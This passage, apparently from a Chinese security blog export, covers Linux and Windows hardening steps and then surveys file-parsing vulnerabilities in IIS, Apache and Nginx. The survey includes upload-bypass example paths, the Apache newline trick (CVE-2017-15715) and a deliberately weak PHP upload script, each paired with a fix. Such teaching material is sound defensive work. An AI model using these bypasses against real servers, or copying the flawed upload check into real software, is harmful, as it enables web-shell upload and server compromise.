<h2 id="设置系统日志策略配置文件"><a href="#设置系统日志策略配置文件" class="headerlink" title="设置系统日志策略配置文件"></a>设置系统日志策略配置文件</h2><p>日志的主要用途是<strong>系统审计、监测追踪和分析统计</strong>。<br>为了保证 Linux 系统正常运行、准确解决遇到的各种各样的系统问题，认真地读取日志文件是管理员的一项非常重要的任务。UNIX/Linux采用了syslog工具来实现此功能，如果配置正确的话，所有在主机上发生的事情都会被记录下来，不管是好的还是坏的。</p>
<p>检查方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps -aef | grep syslog   &#x2F;&#x2F;确定syslog服务是否启用</span><br><span class="line">cat &#x2F;etc&#x2F;rsyslog.conf   &#x2F;&#x2F;查看syslogd的配置文件</span><br><span class="line">cat &#x2F;var&#x2F;log&#x2F;messages   &#x2F;&#x2F;查看系统日志</span><br><span class="line">cat &#x2F;var&#x2F;log&#x2F;cron       &#x2F;&#x2F;查看cron日志</span><br><span class="line">cat &#x2F;var&#x2F;log&#x2F;secure     &#x2F;&#x2F;查看安全日志</span><br></pre></td></tr></table></figure>
<p>详细配置文件的说明可以参考这篇博客：<br><a href="https://www.cnblogs.com/lizhouwei/p/10134049.html">https://www.cnblogs.com/lizhouwei/p/10134049.html</a></p>
<h2 id="阻止系统响应任何从外部-内部来的ping请求"><a href="#阻止系统响应任何从外部-内部来的ping请求" class="headerlink" title="阻止系统响应任何从外部/内部来的ping请求"></a>阻止系统响应任何从外部/内部来的ping请求</h2><p>加固方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;icmp_echo_ignore_all</span><br></pre></td></tr></table></figure>
<p>执行以上命令，其他客户端就不能ping通服务器了</p>
<p><img src="https://qiniu.hzktester.top/tp2020101521.png" alt="image"></p>
]]></content>
      <categories>
        <category>安全加固</category>
      </categories>
      <tags>
        <tag>linux系统加固</tag>
      </tags>
  </entry>
  <entry>
    <title>windows操作系统加固</title>
    <url>/posts/c63e133.html</url>
    <content><![CDATA[<h1 id="windows系统基本操作"><a href="#windows系统基本操作" class="headerlink" title="windows系统基本操作"></a>windows系统基本操作</h1><h2 id="windows常见目录"><a href="#windows常见目录" class="headerlink" title="windows常见目录"></a>windows常见目录</h2><table>
<thead>
<tr>
<th>路径</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>C:\Windows\System32</td>
<td>存放系统配置文件</td>
</tr>
<tr>
<td>C:\Windows\SysWOW64</td>
<td>Windows操作系统的子系统</td>
</tr>
<tr>
<td>C:\Windows\System32\config\SAM</td>
<td>存放windows帐号和密码</td>
</tr>
<tr>
<td>C:\Windows\System32\drivers\etc\hosts</td>
<td>DNS解析文件</td>
</tr>
<tr>
<td>C:\Program Files、C:\Program Files (x86)</td>
<td>64位系统安装在Windows操作系统的子系统,32位下会安装在x86下</td>
</tr>
<tr>
<td>C:\Windows\System32\winevt\Logs</td>
<td>日志目录</td>
</tr>
</tbody></table>
<h2 id="windows常用系统命令"><a href="#windows常用系统命令" class="headerlink" title="windows常用系统命令"></a>windows常用系统命令</h2><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>ver</td>
<td>查看系统版本</td>
</tr>
<tr>
<td>hostname</td>
<td>查看主机名</td>
</tr>
<tr>
<td>ipconfig /all</td>
<td>查看网络配置</td>
</tr>
<tr>
<td>net user/localgroup/share/config</td>
<td>查看用户/用户组/共享/当前运行可配置服务</td>
</tr>
<tr>
<td>at</td>
<td>建立或查看系统作业</td>
</tr>
<tr>
<td>netstat</td>
<td>查看开放端口</td>
</tr>
<tr>
<td>secpol.msc</td>
<td>查看和修改本地安全设置</td>
</tr>
<tr>
<td>services.msc</td>
<td>查看和修改服务</td>
</tr>
<tr>
<td>eventvwr.msc</td>
<td>查看日志</td>
</tr>
<tr>
<td>regedit</td>
<td>打开注册表</td>
</tr>
<tr>
<td>whoami</td>
<td>查看当前操作用户的用户名</td>
</tr>
</tbody></table>
<h2 id="windows常见端口"><a href="#windows常见端口" class="headerlink" title="windows常见端口"></a>windows常见端口</h2><table>
<thead>
<tr>
<th>端口</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>80/8080/8081</td>
<td>HTTP协议代理服务器常用端口号</td>
</tr>
<tr>
<td>443</td>
<td>HTTPS协议代理服务器常用端口号</td>
</tr>
<tr>
<td>21</td>
<td>FTP(文件传输协议)协议代理服务器常用端口号</td>
</tr>
<tr>
<td>23</td>
<td>Telnet(远程登录)协议代理服务器常用端口号</td>
</tr>
<tr>
<td>22</td>
<td>SSH（安全登录）、SCP（文件传输）</td>
</tr>
<tr>
<td>1521</td>
<td>Oracle 数据库</td>
</tr>
<tr>
<td>1433</td>
<td>MS SQL SERVER数据库</td>
</tr>
<tr>
<td>1080</td>
<td>QQ</td>
</tr>
<tr>
<td>3306</td>
<td>Mysql数据库</td>
</tr>
<tr>
<td>25</td>
<td>SMTP（简单邮件传输协议）</td>
</tr>
</tbody></table>
<h2 id="net命令的使用"><a href="#net命令的使用" class="headerlink" title="net命令的使用"></a>net命令的使用</h2><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>net user abc /add</td>
<td>创建（空密码）账户abc</td>
</tr>
<tr>
<td>net user abc</td>
<td>查看账户abc的详细信息</td>
</tr>
<tr>
<td>net user abc /del</td>
<td>删除账户abc</td>
</tr>
<tr>
<td>net user abc 123/add</td>
<td>创建普通账户abc，密码为123</td>
</tr>
<tr>
<td>net localgroup administrators abc /add</td>
<td>把abc用户加入管理员组</td>
</tr>
<tr>
<td>net localgroup administrators abc /del</td>
<td>把abc用户退出管理员组</td>
</tr>
<tr>
<td>net user abc /active:yes[no]</td>
<td>启用[停用]abc账户</td>
</tr>
<tr>
<td>net localgroup admin /add[del]</td>
<td>新建[删除]组admin</td>
</tr>
<tr>
<td>net share</td>
<td>查看本地开启的共享</td>
</tr>
<tr>
<td>netstat</td>
<td>查看开启哪些端口</td>
</tr>
</tbody></table>
<h1 id="windows系统加固"><a href="#windows系统加固" class="headerlink" title="windows系统加固"></a>windows系统加固</h1><p>账号安全是计算机系统安全的第一关，如果计算机系统账号被盗用，那<br>么计算机将非常危险，入侵者可以任意控制计算机系统，如果计算机中存在<br>着重要的机密文件，或者银行卡号和密码，那么损失会非常严重。</p>
<h2 id="账号及安全策略"><a href="#账号及安全策略" class="headerlink" title="账号及安全策略"></a>账号及安全策略</h2><p>账号安全设置方法：</p>
<p>“开始”—“运行”输入<code>secpol.msc</code>（控制面板——系统和安全——管理工具）</p>
<p>账号锁定策略：</p>
<p><img src="https://qiniu.hzktester.top/tp2020101401.png" alt="image"></p>
<p>账号密码策略：</p>
<p><img src="https://qiniu.hzktester.top/tp2020101402.png" alt="image"></p>
<h2 id="禁用Guest账户权限"><a href="#禁用Guest账户权限" class="headerlink" title="禁用Guest账户权限"></a>禁用Guest账户权限</h2><p>我的电脑—右击—管理—计算机管理—本地用户和组—用户—Guest—右键—属性—<br>常规—选择“账户已禁用”。</p>
<p><img src="https://qiniu.hzktester.top/tp2020101403.png" alt="image"></p>
<p>或使用命令<code>net user guest /active:no</code>(cmd管理员模式执行)</p>
<h2 id="Administartor账号、组重命名"><a href="#Administartor账号、组重命名" class="headerlink" title="Administartor账号、组重命名"></a>Administartor账号、组重命名</h2><p><code>Administartor</code>账号、组重命名，可增加账号安全性</p>
<p><img src="https://qiniu.hzktester.top/tp2020101404.png" alt="image"></p>
<p><img src="https://qiniu.hzktester.top/tp2020101405.png" alt="image"></p>
<h2 id="日志及审核策略"><a href="#日志及审核策略" class="headerlink" title="日志及审核策略"></a>日志及审核策略</h2><p>“开始”—“运行”输入<code>secpol.msc</code>（控制面板——系统和安全——管理工具）</p>
<p>对重要事件进行审核记录，方便日后出现问题时查找问题根源。</p>
<p><img src="https://qiniu.hzktester.top/tp2020101406.png" alt="image"></p>
<h3 id="调整事件日志的大小及覆盖策略"><a href="#调整事件日志的大小及覆盖策略" class="headerlink" title="调整事件日志的大小及覆盖策略"></a>调整事件日志的大小及覆盖策略</h3><p>设置方法：“开始”—“运行”输入<code>eventvwr.msc</code></p>
<p>增大日志大小，避免由于日志文件容量过小导致重要日志记录遗漏</p>
<table>
<thead>
<tr>
<th>日志类型</th>
<th>日志大小</th>
<th>覆盖策略</th>
</tr>
</thead>
<tbody><tr>
<td>应用程序</td>
<td>80000KB</td>
<td>覆盖早于30天的日志</td>
</tr>
<tr>
<td>安全日志</td>
<td>80000KB</td>
<td>覆盖早于30天的日志</td>
</tr>
<tr>
<td>系统日志</td>
<td>80000KB</td>
<td>覆盖早于30天的日志</td>
</tr>
</tbody></table>
<p><img src="https://qiniu.hzktester.top/tp2020101407.png" alt="image"><br><img src="https://qiniu.hzktester.top/tp2020101408.png" alt="image"><br><img src="https://qiniu.hzktester.top/tp2020101409.png" alt="image"></p>
<blockquote>
<p>在一个完整的信息系统里面，日志系统是一个非常重要的功能组成部分。<br>它可以记录下系统所产生的所有行为，并按照某种规范表达出来。我们可以<br>使用日志系统所记录的信息为系统进行排错，优化系统的性能，或者根据这<br>些信息调整系统的行为。在安全领域，日志系统的重要地位尤甚，可以说是<br>安全审计方面最主要的工具之一。</p>
</blockquote>
<h2 id="安全选项策略设置"><a href="#安全选项策略设置" class="headerlink" title="安全选项策略设置"></a>安全选项策略设置</h2><p>本地安全策略-&gt;本地策略-&gt;安全选项</p>
<h3 id="Microsoft-网络服务器"><a href="#Microsoft-网络服务器" class="headerlink" title="Microsoft 网络服务器"></a>Microsoft 网络服务器</h3><ul>
<li><p>Microsoft 网络服务器：登录时间过期后断开与客户端的连接（启用）</p>
<blockquote>
<p>目的：可以避免用户在不适合的时间登录到系统,或者用户登录到系统后忘记退出登录</p>
</blockquote>
</li>
<li><p>Microsoft 网络服务器：暂停会话前所需的空闲时间数量（小于30分钟）</p>
<blockquote>
<p>目的：设置挂起会话之前所需的空闲时间为30分钟    </p>
</blockquote>
</li>
<li><p>Microsoft 网络客户端：将未加密的密码发送到第三方SMB服务期（禁用）</p>
<blockquote>
<p>目的：禁止发送未加密的密码到第三方SMB服务器</p>
</blockquote>
<p>  <img src="https://qiniu.hzktester.top/tp2020101410.png" alt="image"></p>
<h3 id="恢复控制台"><a href="#恢复控制台" class="headerlink" title="恢复控制台"></a>恢复控制台</h3></li>
<li><p>恢复控制台:允许软盘复制并访问所有驱动器和所有文件夹（禁用）</p>
<blockquote>
<p>目的：禁止它访问硬盘驱动器上的所有文件和目录。它仅允许访问每个卷的根目录%systemroot%目录及子目录，即使是这样它还限制不允许把硬盘驱动器上的文件拷贝到软盘上</p>
</blockquote>
</li>
<li><p>恢复控制台:允许自动系统管理级登录（禁用）</p>
<blockquote>
<p>目的：恢复控制台是Windows 2003的一个新特性，它在一个不能启动的系统上给出一个受限的命令行访问界面。可能会导致任何可以重起系统的人绕过账号口令限制和其它安全设置而访问系统</p>
</blockquote>
<p>  <img src="https://qiniu.hzktester.top/tp2020101411.png" alt="image"></p>
<h3 id="关机"><a href="#关机" class="headerlink" title="关机"></a>关机</h3></li>
<li><p>关机：清除虚拟内存页面文件（启用）</p>
<blockquote>
<p>目的：某些第三方的程序可能把一些没有加密的密码存在内存中，页面文件中也可能含有另外一些敏感的资料。关机的时候清除页面文件，防止造成意外的信息泄漏</p>
</blockquote>
</li>
<li><p>关机：允许系统在未登录的情况下关机（禁用）</p>
<blockquote>
<p>目的：防止连接远程桌面后恶意关机计算机</p>
</blockquote>
<p>  <img src="https://qiniu.hzktester.top/tp2020101412.png" alt="image"></p>
<h3 id="交互式登录"><a href="#交互式登录" class="headerlink" title="交互式登录"></a>交互式登录</h3></li>
<li><p>交互式登录：登陆时不显示用户名（启用）</p>
<blockquote>
<p>目的：登录时不显示上次登录的用户名，防止暴露用户名。</p>
</blockquote>
</li>
<li><p>交互式登录：无需按Ctrl+Alt+Del（禁用）</p>
<blockquote>
<p>目的：登录时需要按CTRL+ALT+DEL</p>
</blockquote>
</li>
<li><p>交互式登录：之前登录到缓存的次数（域控制器不可用时），设置为0</p>
<blockquote>
<p>目的：登陆时不显示上次的用户名，防止暴露用户名</p>
</blockquote>
<p>  <img src="https://qiniu.hzktester.top/tp2020101413.png" alt="image"></p>
<h3 id="审核"><a href="#审核" class="headerlink" title="审核"></a>审核</h3></li>
<li><p>审核：如果无法记录安全审核则立即关闭系统</p>
</li>
<li><p>审核：对全局系统对象的访问进行审核（启用）</p>
<p>  <img src="https://qiniu.hzktester.top/tp2020101414.png" alt="image"></p>
<h3 id="网络访问"><a href="#网络访问" class="headerlink" title="网络访问"></a>网络访问</h3></li>
<li><p>网络访问：不允许SAM帐户和共享的匿名枚举（启用）</p>
<blockquote>
<p>目的：禁止使用匿名用户空连接枚举系统敏感信息</p>
</blockquote>
</li>
<li><p>网络访问：不允许存储网络身份验证和密码和凭据（启用）</p>
</li>
<li><p>网络访问：本地账户的共享和安全模型（仅来宾–本地账户以来宾用户身份验证）</p>
</li>
<li><p>网络访问：可匿名访问的共享（全部删除）</p>
</li>
<li><p>网络访问：可匿名访问的命名管道 （全部删除）</p>
</li>
<li><p>网络访问：可远程访问的注册表路径（全部删除）</p>
</li>
<li><p>网络访问：可远程访问的注册表路径和子路径 （全部删除）</p>
<p>  <img src="https://qiniu.hzktester.top/tp2020101415.png" alt="image"></p>
</li>
</ul>
<h2 id="文件权限设置"><a href="#文件权限设置" class="headerlink" title="文件权限设置"></a>文件权限设置</h2><p>文件系统又被称作文件管理系统，它是指操作系统中负责管理和存储文件信息的软件机构。文件系统由与文件管理有关的软件、被管理的文件以及实施文件管理所需的数据结构这三部分构成。</p>
<p>从系统角度来看，文件系统是对文件存储器空间进行组织和分配，负责文件的存储并对存入的文件进行保护和检索的系统。具体地说，它负责为用户建立文件，存入、读出、修改、转储文件，控制文件的存取，当用户不再使用时撤销文件等。</p>
<table>
<thead>
<tr>
<th>路径</th>
<th>权限</th>
</tr>
</thead>
<tbody><tr>
<td>系统分区C盘</td>
<td>administrator、system完全控制</td>
</tr>
<tr>
<td>C:\Documents and Settings\</td>
<td>administrator、system完全控制</td>
</tr>
<tr>
<td>C:\windows\system32\</td>
<td>administrator读写</td>
</tr>
<tr>
<td>C:\progran files</td>
<td>为Common File目录之外的所有目录赋予Administrators 和SYSTEM 完全控制</td>
</tr>
<tr>
<td>C:\windows</td>
<td>系统管理员完全控制、system拒绝(继承)</td>
</tr>
<tr>
<td>C:\windows\system32</td>
<td>其关键程序只允许administrator完全控制</td>
</tr>
<tr>
<td>C:\Inetpub\</td>
<td>administrator、system完全控制，必要时可以删除该目录</td>
</tr>
<tr>
<td>网站目录所在磁盘</td>
<td>administrator、system完全控制</td>
</tr>
<tr>
<td>设置权限方法：</td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://qiniu.hzktester.top/tp2020101416.png" alt="image"></p>
<h2 id="注册表安全设置"><a href="#注册表安全设置" class="headerlink" title="注册表安全设置"></a>注册表安全设置</h2><p>通过注册表，用户可以轻易地添加、删除、修改windows系统内的软件<br>配置信息或硬件驱动程序，这不仅方便了用户对系统软硬件的工作状态进行<br>适时的调整，于此同时注册表也是入侵者攻击的目标，通过注册表也可称为入侵者攻击的目标，通过注册表种植木马、修改软件信息，甚至删除、停用<br>或改变硬件的工作状态。</p>
<table>
<thead>
<tr>
<th>注册表</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>HKEY_LOCAL_MACHINE</td>
<td>包含关于本地计算机系统的信息，包括硬件和操作系统数据</td>
</tr>
<tr>
<td>HKEY_LOCAL_ROOT</td>
<td>包含各种OLE技术使用的信息技术和文件类别关联数据</td>
</tr>
<tr>
<td>HKEY_LOCAL_USER</td>
<td>包含环境变量、桌面设置、网络连接、打印机和程序首选项</td>
</tr>
<tr>
<td>HKEY_LOCAL_USERS</td>
<td>包含关于动态加载的用户配置文件和默认的配置文件的信息。有 些信息和HKEY_CURRENT_USER交叉出现</td>
</tr>
<tr>
<td>HKEY_CURRENT_CONFIG</td>
<td>包含在启动时由本地计算机系统使用的硬件配置文件的相关信息</td>
</tr>
</tbody></table>
<h3 id="注册表权限"><a href="#注册表权限" class="headerlink" title="注册表权限"></a>注册表权限</h3><p>利用文件管理器对<code>regedit.exe</code>文件设置成只允许管理员能使用命令访问修改注册表，其他用户只能读取，但不是修改这样就可以防止非法用户恶意修改注册表。</p>
<p><img src="https://qiniu.hzktester.top/tp2020101417.png" alt="image"></p>
<h3 id="禁止空链接"><a href="#禁止空链接" class="headerlink" title="禁止空链接"></a>禁止空链接</h3><p>禁用IPC连接，编辑注册表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\restrictanonymous值为1</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020101418.png" alt="image"></p>
<h3 id="删除系统默认共享"><a href="#删除系统默认共享" class="headerlink" title="删除系统默认共享"></a>删除系统默认共享</h3><p>删除服务器上的管理员共享</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKLM\System\CurrentControlSet\Services\LanmanServer\Parameters\AutoShareServer设置为0</span><br></pre></td></tr></table></figure>

<p><img src="https://qiniu.hzktester.top/tp2020101419.png" alt="image"></p>
<p>使用<code>net share</code>命令查看默认共享</p>
<p><img src="https://qiniu.hzktester.top/tp2020101420.png" alt="image"></p>
<p>使用<code>net share &lt;共享名&gt; /del</code>删除默认共享（管理员身份运行）</p>
<p><img src="https://qiniu.hzktester.top/tp2020101421.png" alt="image"></p>
<h3 id="修改默认3389远程端口"><a href="#修改默认3389远程端口" class="headerlink" title="修改默认3389远程端口"></a>修改默认3389远程端口</h3><p>修改注册表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\PortNumber</span><br></pre></td></tr></table></figure>

<p><img src="https://qiniu.hzktester.top/tp2020101422.png" alt="image"></p>
<h2 id="关闭135-139-445隐患端口"><a href="#关闭135-139-445隐患端口" class="headerlink" title="关闭135 139 445隐患端口"></a>关闭135 139 445隐患端口</h2><h3 id="关闭135端口"><a href="#关闭135端口" class="headerlink" title="关闭135端口"></a>关闭135端口</h3><p>”开始“–“运行”，输入”dcomcnfg”，单击“确定”，打开组件服务</p>
<p>右键我的电脑，单击”属性”，在默认属性中 <strong>去掉 在此计算机上启用分布式COM</strong> 前打勾<br>选择”默认协议”选项卡，<strong>移除“面向连接的TCP/IP”</strong>，单击”确定”按钮，设置完成，重新启动后即可关闭135端口</p>
<p><img src="https://qiniu.hzktester.top/tp2020101423.png" alt="image"></p>
<p><img src="https://qiniu.hzktester.top/tp2020101424.png" alt="image"></p>
<h3 id="关闭139端口"><a href="#关闭139端口" class="headerlink" title="关闭139端口"></a>关闭139端口</h3><p>右键我的”网上邻居“，单击”属性“，再打开本地连接的”属性</p>
<p>选中Internet协议(TCP/IP),常规选项卡-高级</p>
<p>设置WINS选项卡”禁用TCP/IP上的NETBIOS”</p>
<p><img src="https://qiniu.hzktester.top/tp2020101425.png" alt="image"></p>
<h3 id="关闭445端口"><a href="#关闭445端口" class="headerlink" title="关闭445端口"></a>关闭445端口</h3><p>修改注册表，添加一个键值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetBT\Parameters在右面的窗口</span><br><span class="line">新建一个SMBDeviceEnabled 为REG_DWORD类型键值为 0。</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020101426.png" alt="image"></p>
]]></content>
      <categories>
        <category>安全加固</category>
      </categories>
      <tags>
        <tag>windows系统加固</tag>
      </tags>
  </entry>
  <entry>
    <title>Web中间件常见解析漏洞总结</title>
    <url>/posts/37b72f03.html</url>
    <content><![CDATA[<h1 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h1><p><code>IIS</code>是<code>Internet Information Services</code>的缩写，意为互联网信息服务，是由微软公司提供的基于运行<code>Microsoft Windows</code>的互联网基本服务。</p>
<blockquote>
<p>IIS目前只适用于Windows系统，不适用于其他操作系统。</p>
</blockquote>
<h2 id="IIS-6-x"><a href="#IIS-6-x" class="headerlink" title="IIS 6.x"></a>IIS 6.x</h2><h3 id="文件名解析漏洞"><a href="#文件名解析漏洞" class="headerlink" title="文件名解析漏洞"></a>文件名解析漏洞</h3><p>该版本默认会将<code>*.asp;.jpg</code>此种格式的文件名，当成<code>Asp</code>解析，原理是 服务器默认不解析<code>;</code>号及其后面的内容，相当于截断。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.x.x&#x2F;test.asp;.jpg</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020101201.png" alt="image"></p>
<h3 id="文件夹名解析漏洞"><a href="#文件夹名解析漏洞" class="headerlink" title="文件夹名解析漏洞"></a>文件夹名解析漏洞</h3><p>该版本默认会将<code>*.asp/</code>目录下的所有文件当成<code>Asp</code>解析。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.x.x&#x2F;test.asp&#x2F;xxx.jpg</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020101202.png" alt="image"></p>
<p>另外，<code>IIS6.x</code>除了会将扩展名为<code>.asp</code>的文件解析为<code>asp</code>之外，还默认会将扩展名为<code>.asa</code>，<code>.cdx</code>，<code>.cer</code>解析为<code>asp</code></p>
<p><img src="https://qiniu.hzktester.top/tp2020101203.png" alt="image"></p>
<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>由于微软并不认为这是一个漏洞，也没有推出<code>IIS 6.0</code>的补丁，因此漏洞需要自己修复。</p>
<ol>
<li>限制上传目录执行权限，不允许执行脚本。</li>
</ol>
<p><img src="https://qiniu.hzktester.top/tp2020101204.png" alt="image"></p>
<ol start="2">
<li>不允许新建目录。</li>
<li>上传的文件需经过重命名(时间戳+随机数+.jpg等)</li>
</ol>
<h2 id="IIS-7-x"><a href="#IIS-7-x" class="headerlink" title="IIS 7.x"></a>IIS 7.x</h2><h3 id="IIS-7-x解析漏洞"><a href="#IIS-7-x解析漏洞" class="headerlink" title="IIS 7.x解析漏洞"></a>IIS 7.x解析漏洞</h3><p><code>IIS7.x</code>版本在<code>Fast-CGI</code>运行模式下,在任意文件，例：<code>test.jpg</code>后面加上<code>/.php</code>，会将<code>test.jpg</code>解析为<code>php</code>文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.x.x&#x2F;test.jpg&#x2F;.php</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020101205.png" alt="image"></p>
<h3 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h3><p>配置<code>php.ini</code>中的<code>cgi.fix_pathinfo</code>为0并重启<code>php-cgi</code>程序</p>
<p><img src="https://qiniu.hzktester.top/tp2020101206.png" alt="image"></p>
<p>结果如下：</p>
<p><img src="https://qiniu.hzktester.top/tp2020101207.png" alt="image"></p>
<h1 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h1><p><code>Apache</code>是世界使用排名第一的<code>Web</code>服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的<code>API</code>扩充，将<code>Perl/Python</code>等解释器编译到服务器中。</p>
<h2 id="未知扩展名解析漏洞"><a href="#未知扩展名解析漏洞" class="headerlink" title="未知扩展名解析漏洞"></a>未知扩展名解析漏洞</h2><p><code>Apache</code>的解析漏洞依赖于一个特性： <strong>Apache默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别（不在mime.types文件内），则继续向左识别，直到识别到合法后缀才进行解析。</strong></p>
<p>访问<code>phpinfo.php.xxx</code></p>
<p><img src="https://qiniu.hzktester.top/tp2020101208.png" alt="image"></p>
<p>实战中可以上传<code>rar</code>，<code>owf</code>等文件进行利用，如果上传<code>phpinfo.php.jpg</code>，即使文件名中有<code>.php</code>，也会直接解析为<code>jpg</code>。因为<code>Apache</code>认识<code>.jpg</code>,停止继续向左识别。</p>
<h2 id="AddHandler导致的解析漏洞"><a href="#AddHandler导致的解析漏洞" class="headerlink" title="AddHandler导致的解析漏洞"></a>AddHandler导致的解析漏洞</h2><p>如果运维人员给<code>.php</code>后缀增加了处理器：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddHandler application&#x2F;x-httpd-php .php</span><br></pre></td></tr></table></figure>
<p>那么，在有多个后缀的情况下，只要一个文件名中含有<code>.php</code>后缀，即被识别成<code>PHP</code>文件，没必要是最后一个后缀。<br>利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p>
<p><img src="https://qiniu.hzktester.top/tp2020101209.png" alt="image"></p>
<p>即使最右边的文件格式是在<code>mime.types</code>文件内，只要文件名中出现<code>.php</code>，就直接被解析为<code>php</code>。</p>
<h2 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h2><p>影响范围：2.4.0~2.4.29版本</p>
<p>环境：phpstudy2014 Apache + PHP5.4n</p>
<p>此漏洞形成的根本原因，在于<code>$</code>, 正则表达式中<code>$</code>不仅匹配字符串结尾位置，也可以匹配<code>\n</code> 或<code>\r</code></p>
<p>在解析<code>PHP</code>时，<code>1.php\x0A</code>将被按照<code>PHP</code>后缀进行解析，导致绕过一些服务器的安全策略。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch \.php$&gt;</span><br><span class="line">    SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>
<p>测试代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;name&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;上传文件&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_FILES[&#39;file&#39;])) &#123;</span><br><span class="line">    $name &#x3D; basename($_POST[&#39;name&#39;]);</span><br><span class="line">    $ext &#x3D; pathinfo($name,PATHINFO_EXTENSION);</span><br><span class="line">    if(in_array($ext, [&#39;php&#39;, &#39;php3&#39;, &#39;php4&#39;, &#39;php5&#39;, &#39;phtml&#39;, &#39;pht&#39;])) &#123;</span><br><span class="line">        exit(&#39;bad file&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">echo &quot;ok&quot;;</span><br><span class="line">    move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &#39;.&#x2F;&#39; . $name);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020101210.png" alt="image"></p>
<p>点击Go后，效果如下:</p>
<p><img src="https://qiniu.hzktester.top/tp2020101211.png" alt="image"></p>
<p>相同代码在Linux下进行测试，可以正常写入。</p>
<p><img src="https://qiniu.hzktester.top/tp2020101212.png" alt="image"></p>
<p>访问：</p>
<p><img src="https://qiniu.hzktester.top/tp2020101213.png" alt="image"></p>
<p>限制：获取文件名时不能用<code>$_FILES[‘file’][‘name’]</code>，因为它会自动把换行去掉。</p>
<p><img src="https://qiniu.hzktester.top/tp2020101214.png" alt="image"></p>
<h2 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h2><ol>
<li>升级到最新版本</li>
<li>或将上传的文件重命名为为时间戳+随机数+.jpg的格式并禁用上传文件目录执行脚本权限。</li>
</ol>
<h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><p><code>Nginx</code>是一款轻量级的<code>Web</code> 服务器/反向代理服务器及电子邮件<code>（IMAP/POP3）</code>代理服务器，在<code>BSD-like</code> 协议下发行。其特点是占有内存少，并发能力强，事实上<code>nginx</code>的并发能力确实在同类型的网页服务器中表现较好</p>
<h2 id="Nginx配置文件错误导致的解析漏洞"><a href="#Nginx配置文件错误导致的解析漏洞" class="headerlink" title="Nginx配置文件错误导致的解析漏洞"></a>Nginx配置文件错误导致的解析漏洞</h2><p>对于任意文件名，在后面添加<code>/xxx.php</code>（xxx为任意字符）后,即可将文件作为<code>php</code>解析。</p>
<p>例：<code>info.jpg</code>后面加上<code>/xxx.php</code>，会将<code>info.jpg</code> 以<code>php</code>解析。</p>
<p><img src="https://qiniu.hzktester.top/tp2020101215.png" alt="image"></p>
<p>该漏洞是<code>Nginx</code>配置所导致，与<code>Nginx</code>版本无关，下面是常见的漏洞配置。</p>
